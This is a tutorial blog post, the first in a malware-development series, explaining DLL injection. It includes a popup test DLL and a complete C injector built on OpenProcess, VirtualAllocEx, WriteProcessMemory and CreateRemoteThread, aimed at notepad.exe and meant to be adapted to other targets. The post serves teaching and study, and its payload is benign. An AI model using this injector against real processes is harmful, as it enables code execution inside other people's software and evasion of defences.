---
title: DLL Injection
date: 2024-03-17
categories:
  - Malware Development
  - Process Injection
tags:
  - Maldev-Academy
toc: "true"
---
This is the first episode of the  "Unraveling the Malware Mysteries" series. Check out the entire series at [Unraveling the Malware Mysteries](https://noelit911.github.io/Unraveling-the-Malware-Mysteries/)

Dynamic Link Library (DLL) injection is a technique used in the realm of software development and cybersecurity. It involves inserting a DLL into the address space of a running process, thereby altering its behavior or extending its functionality. While primarily used for legitimate purposes such as debugging and system monitoring, DLL injection can also be leveraged for malicious activities like code execution and privilege escalation. 

In this blog post, we'll delve into the workings of DLL injection, its various types, and which nasty things can we do with it.

# Understanding DLL Injection
---------------
At its core, DLL injection is about injecting external code into the memory space of a running process. This allows the injected code to execute within the context of the target process, granting it access to resources and functionalities it wouldn't normally have. The injection process typically involves the following steps:

1. **Selection of Target Process**: The first step is to identify the process into which the DLL will be injected. This could be any running application or system process.
    
2. **Loading the DLL**: The DLL to be injected is loaded into the memory space of the target process. This can be achieved through various means, including using APIs like LoadLibrary or manually mapping the DLL into memory. We will address this techniques later. 
    
3. **Injection**: Once the DLL is loaded into the target process, the next step is to execute its code within that process. This is often achieved by creating a remote thread within the target process and directing it to execute a specific function within the injected DLL.

# Types of DLL Injection
---------------
DLL injection techniques can be classified into several categories, each with its own advantages and use cases. Some common types include:

1. **Load-time Injection**: In load-time injection, the DLL is loaded into the target process's address space at the time of process creation. This can be achieved by specifying the DLL in the process's import table or by modifying the process's environment variables to include the DLL's path.
    
2. **Run-time Injection**: Run-time injection involves injecting the DLL into a running process. This can be done using APIs like CreateRemoteThread or by directly modifying the target process's memory space to load the DLL.
    
3. **Reflective Injection**: Reflective injection is a more advanced technique where the injected DLL is capable of loading and executing itself without relying on the traditional Windows DLL loading mechanisms. This makes it harder to detect and trace compared to other injection methods. 
    
4. **Code Injection**: In code injection, rather than injecting an entire DLL, small snippets of code are injected into the target process. This code is then executed within the context of the process, allowing for more granular control over its behavior.

# Hands-On: Implementing DLL Injection in C
---------------
In this hands-on section, we'll explore how to implement DLL injection using C code. We'll focus on run-time injection, which involves injecting a DLL into a running process. For this demonstration, we'll create a simple console application to perform the injection.

## Overall process

 First, we need to open a handle to the target process to enable access to its memory space. Then, we reserve space within the target process to store the path of the DLL to be injected. Subsequently, the DLL path is written into this allocated memory space. Finally, a new thread is created within the target process, with its execution directed to a function that loads the DLL into the process's memory space. As a result, the injected DLL becomes part of the target process's execution, enabling it to modify the process's behavior or extend its functionality as desired. 

## Creating the DLL

Below is a simple example of a DLL written in C that opens a popup window when loaded. This DLL utilizes the Windows API functions to create and display a basic message box. We will use this dll for testing purposes:

```c
#include <Windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        MessageBox(NULL, "DLL Loaded!", "DLL Popup", MB_OK | MB_ICONINFORMATION);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

This DLL consists of a single function, `DllMain`, which is called automatically when the DLL is loaded and unloaded. When the DLL is loaded (`DLL_PROCESS_ATTACH`), it displays a message box with the title "DLL Popup" and the message "DLL Loaded!". The `MB_OK | MB_ICONINFORMATION` flags specify that the message box should contain an OK button and an information icon.

To compile this code into a DLL, you can use a C++ compiler such as Microsoft Visual Studio or MinGW. Here's how you can compile it using MinGW:

```bash
g++ -shared -o popup.dll popup.cpp -Wl,--out-implib,libpopup.a
```

Replace `popup.cpp` with the filename of your source code file if it's different. After compiling, you'll have a `popup.dll` file that you can load into a process to trigger the popup window.
## WinAPI Functions

- [**CreateToolhelp32Snapshot()**](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot): This function is used to create a snapshot of the current system's processes, allowing us to enumerate and find the target process by name.

- [**Process32First()**](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first) and [**Process32Next()**](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next): These functions are used to retrieve information about processes in the system, allowing us to iterate through the processes obtained from the snapshot to find the target process by name.

- [**OpenProcess()**](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess): This function opens an existing process object, which is necessary to perform operations such as memory allocation and writing within the target process.

- [**VirtualAllocEx()**](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex): Used to allocate memory within the address space of a specified process, allowing us to reserve space in the target process to store the path of the DLL to be injected.

- [**WriteProcessMemory()**](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory): This function writes data to an area of memory in a specified process, enabling us to write the path of the DLL into the allocated memory space within the target process.

- [**GetModuleHandle()**](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea) and [**GetProcAddress()**](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress): GetModuleHandle retrieves handles to modules, and GetProcAddress retrieves the addresses of exported functions from specified modules, respectively. In this case, they are used to obtain the handle to kernel32.dll and the address of the LoadLibraryA function within kernel32.dll, allowing us to load the DLL into the target process.

- [**CreateRemoteThread()**](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread): This function creates a thread in the address space of another process and begins its execution. We use it to create a remote thread within the target process to execute the LoadLibraryA function, effectively loading the DLL into the target process.


```c
#include <windows.h>
#include <stdio.h>
#include <Tlhelp32.h>

// Function prototypes
HANDLE FindTargetProcessByName(const char* targetProcessName);
LPVOID AllocateMemoryInTargetProcess(HANDLE hProcess, const char* dllPath);
BOOL InjectDllIntoProcess(HANDLE hProcess, LPVOID allocMemAddr, HMODULE hKernel32, const char* dllPath);
void CleanupResources(HANDLE hProcess, LPVOID allocMemAddr, HANDLE hRemoteThread);

int main() {
    const char* targetProcessName = "notepad.exe"; // Change this to the name of the target process
    const char* dllPath = "popup.dll"; // Change this to the path of your DLL

    // Find the target process by name
    HANDLE hProcess = FindTargetProcessByName(targetProcessName);
    if (hProcess == NULL) {
        printf("Error: Target process not found.\n");
        return 1;
    }

    // Allocate memory in the target process for the DLL path
    LPVOID allocMemAddr = AllocateMemoryInTargetProcess(hProcess, dllPath);
    if (allocMemAddr == NULL) {
        printf("Error: Failed to allocate memory in target process.\n");
        CloseHandle(hProcess);
        return 1;
    }

    // Load kernel32.dll and get the address of LoadLibraryA
    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    if (hKernel32 == NULL) {
        printf("Error: Failed to get handle to kernel32.dll.\n");
        CleanupResources(hProcess, allocMemAddr, NULL);
        return 1;
    }

    // Inject the DLL into the target process
    if (!InjectDllIntoProcess(hProcess, allocMemAddr, hKernel32, dllPath)) {
        printf("Error: Failed to inject DLL into target process.\n");
        CleanupResources(hProcess, allocMemAddr, NULL);
        return 1;
    }

    printf("DLL injected successfully.\n");

    // Clean up
    CleanupResources(hProcess, allocMemAddr, NULL);
    return 0;
}

// Finds the target process by name
HANDLE FindTargetProcessByName(const char* targetProcessName) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (strcmp(pe32.szExeFile, targetProcessName) == 0) {
                CloseHandle(hSnapshot);
                return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return NULL;
}

// Allocates memory in the target process for the DLL path
LPVOID AllocateMemoryInTargetProcess(HANDLE hProcess, const char* dllPath) {
    return VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
}

// Injects the DLL into the target process
BOOL InjectDllIntoProcess(HANDLE hProcess, LPVOID allocMemAddr, HMODULE hKernel32, const char* dllPath) {
    if (!WriteProcessMemory(hProcess, allocMemAddr, dllPath, strlen(dllPath) + 1, NULL)) {
        return FALSE;
    }

    LPVOID loadLibraryAddr = GetProcAddress(hKernel32, "LoadLibraryA");
    if (loadLibraryAddr == NULL) {
        return FALSE;
    }

    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, allocMemAddr, 0, NULL);
    if (hRemoteThread == NULL) {
        return FALSE;
    }

    WaitForSingleObject(hRemoteThread, INFINITE);
    CloseHandle(hRemoteThread);
    return TRUE;
}

// Cleans up resources
void CleanupResources(HANDLE hProcess, LPVOID allocMemAddr, HANDLE hRemoteThread) {
    if (hProcess != NULL) {
        CloseHandle(hProcess);
    }
    if (allocMemAddr != NULL) {
        VirtualFreeEx(hProcess, allocMemAddr, 0, MEM_RELEASE);
    }
    if (hRemoteThread != NULL) {
        CloseHandle(hRemoteThread);
    }
}
```

Replace `"notepad.exe"` with the name of the target process you want to inject the DLL into, and `"popup.dll"` with the path to the DLL you want to inject.

Take in mind that creating or trying to modify a process running with high privilege's permissions will result in the script failing. 
# Conclusion
---------------
In this post, we delved into DLL injection, a technique pivotal in both software development and cybersecurity. DLL injection involves inserting an external dynamic link library (DLL) into the memory space of a running process, altering its behavior or enhancing its capabilities. While often used for legitimate purposes like debugging, DLL injection harbors potential for misuse, facilitating malicious activities such as code execution and privilege escalation.

We explored the process of DLL injection, identifying key stages like target process selection, DLL loading, and injection execution. Diverse injection techniques, including load-time, run-time, reflective, and code injection methods, offer unique advantages and complexities. Through a hands-on implementation in C code, we gained practical insights into the mechanics of DLL injection.